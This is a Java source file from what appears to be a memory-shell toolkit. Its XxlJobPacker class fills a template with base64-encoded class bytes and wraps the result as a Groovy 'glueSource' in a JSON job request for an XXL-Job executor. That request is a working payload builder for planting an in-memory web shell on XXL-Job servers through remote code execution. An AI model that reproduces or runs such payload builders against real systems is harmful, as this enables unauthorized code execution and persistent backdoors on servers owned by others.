package com.reajason.javaweb.packer;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import lombok.SneakyThrows;
import org.apache.commons.io.IOUtils;

import java.io.IOException;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

/**
 * @author ReaJason
 * @since 2025/1/21
 */
public class XxlJobPacker implements Packer {
    private final String template = Util.loadTemplateFromResource("/memshell-party/XXL-Job-DefineClass.java");
    private final ObjectMapper objectMapper = new ObjectMapper().enable(SerializationFeature.INDENT_OUTPUT);

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        String source = template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", config.getClassBytesBase64Str());
        Map<String, Object> map = new HashMap<>();
        map.put("jobId", 1);
        map.put("executorHandler", "demoJobHandler");
        map.put("executorParams", "demoJobHandler");
        map.put("executorBlockStrategy", "COVER_EARLY");
        map.put("executorTimeout", 0);
        map.put("logId", 1);
        map.put("logDateTime", System.currentTimeMillis());
        map.put("glueType", "GLUE_GROOVY");
        map.put("glueSource", source);
        map.put("glueUpdatetime", System.currentTimeMillis());
        map.put("broadcastIndex", 0);
        map.put("broadcastTotal", 0);
        return objectMapper.writeValueAsString(map);
    }
}